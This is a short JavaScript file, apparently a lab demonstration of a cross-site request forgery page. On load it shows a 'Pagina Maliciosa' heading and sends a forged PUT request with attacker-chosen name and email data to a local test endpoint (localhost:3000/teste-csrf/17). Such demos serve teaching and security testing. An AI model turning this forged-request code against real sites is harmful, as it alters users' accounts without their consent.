// Configurações do ataque
const TARGET_URL = 'http://localhost:3000/teste-csrf/17';
const MALICIOUS_DATA = {
  nome: "Hacker",
  email: "hacker@gmail.com"
};

async function executeCSRFAttack() {
  const statusElement = createStatusElement();
  
  try {
    statusElement.innerHTML = 'Iniciando ataque CSRF';
    console.log('[CSRF] Iniciando ataque');
    const response = await fetch(TARGET_URL, {
      method: 'PUT',
      headers: { 
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(MALICIOUS_DATA)
    });
    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Erro HTTP ${response.status}: ${errorText}`);
    }
    const data = await response.json();
    statusElement.innerHTML = 'Ataque CSRF bem-sucedido!';
    console.log('[CSRF] Sucesso:', data);
  } catch (error) {
    statusElement.innerHTML = 'Falha no ataque CSRF';
    console.error('[CSRF] Falha:', error.message);
  }
}

(function() {
  const title = document.createElement('h2');
  title.textContent = 'Pagina Maliciosa';
  title.style.textAlign = 'center';
  title.style.marginTop = '20px';
  document.body.prepend(title);
  
  executeCSRFAttack();
})();